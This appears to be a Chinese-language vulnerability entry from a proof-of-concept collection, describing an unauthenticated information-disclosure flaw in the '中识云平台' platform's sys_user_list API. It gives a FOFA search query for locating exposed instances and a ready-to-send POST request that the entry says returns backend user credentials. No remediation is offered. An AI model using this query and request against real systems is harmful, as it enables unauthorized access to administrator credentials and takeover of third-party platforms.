## 中识云平台-sys_user_list-信息泄露漏洞

## 一、漏洞简介
中识云平台 sys_user_list接口存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取网站后台系统用户密码等敏感信息，从而登录网站后台系统，使网站处于极不安全的状态。

## fofa
```
title="中识云平台"
```

## POC
```
POST /api/sys/sys_user_list?userName=admin HTTP/1.1
Host: example.com
Content-Type: application/json
Accept-Encoding: gzip
Content-Length: 35
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56

{"page":1,"limit":10,"username":""}
```
